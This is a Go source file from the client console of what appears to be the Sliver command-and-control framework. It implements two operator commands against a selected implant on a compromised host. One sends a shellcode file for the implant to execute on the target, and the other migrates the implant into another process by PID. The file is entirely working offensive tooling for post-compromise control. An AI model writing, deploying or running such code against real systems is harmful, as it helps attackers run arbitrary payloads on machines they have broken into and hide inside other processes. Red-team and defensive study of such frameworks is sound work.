package command

import (
	"fmt"
	"io/ioutil"
	"strconv"

	"sliver/client/spin"
	clientpb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func executeShellcode(ctx *grumble.Context, rpc RPCServer) {

	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a path to the shellcode\n")
		return
	}
	shellcodePath := ctx.Args[0]
	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		fmt.Printf(Warn+"Error: %s\n", err.Error())
	}
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", activeSliver.Name)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.TaskReq{
		Data:     shellcodeBin,
		SliverID: ActiveSliver.Sliver.ID,
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgTask,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	}
	fmt.Printf(Info + "Executed payload on target\n")
}

func migrate(ctx *grumble.Context, rpc RPCServer) {
	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a PID to migrate to")
		return
	}

	pid, err := strconv.Atoi(ctx.Args[0])
	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
	}
	config := GetConfig(activeSliver.Name)
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Migrating into %d ...", pid)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.MigrateReq{
		Pid:      uint32(pid),
		Config:   config,
		SliverID: ActiveSliver.Sliver.ID,
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgMigrate,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	} else {
		fmt.Printf("\n"+Info+"Successfully migrated to %d\n", pid)
	}
}
